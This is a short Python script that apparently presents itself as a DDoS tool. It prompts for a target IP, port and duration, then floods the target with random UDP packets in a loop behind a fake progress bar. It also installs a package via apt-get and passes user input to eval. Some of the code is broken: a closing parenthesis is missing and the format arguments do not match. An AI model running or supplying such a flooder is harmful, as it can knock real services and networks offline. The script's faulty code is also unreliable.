import socket
import threading
import os
import sys
import time

os.system("clear")

print (''' \033[92m
  ____  ____             __  __         
 |  _ \|  _ \  ___  ___  \ \/ /___  ___ 
 | | | | | | |/ _ \/ __|  \  // _ \/ __|
 | |_| | |_| | (_) \__ \  /  \  __/ (__ 
 |____/|____/ \___/|___/ /_/\_\___|\___|©''')

print()
time.sleep(2)
import sys
import os
import time
import socket
import random
from termcolor import colored
#This is where the magic starts using the power of python
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1337)
#############
#Install Figlet
os.system("apt-get install -y figlet")
os.system("clear")
os.system("figlet Hacking")
print()
ip = input(" IP Target: => ")
port = eval(input(" Port  : => "))
dur = input(" Time: => ")
timeout = time.time() + int(dur)
sent = 0
os.system("clear")
os.system("figlet Attack Starting")
print(colored("[                    ] 0% ",'blue'))
time.sleep(2.9)
print(colored("[=====               ] 25%", 'red'))
time.sleep(2.9)
print(colored("[==========          ] 50%",'magenta'))
time.sleep(2.9)
print(colored("[===============     ] 75%", 'yellow'))
time.sleep(2.9)
print(colored("[====================] 100%",'green'))
time.sleep(2)
while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent += 1
        print(colored("[!] sent %s Target: %s" % (sent, ip, port), 'yellow')
    except KeyboardInterrupt:
        sys.exit()
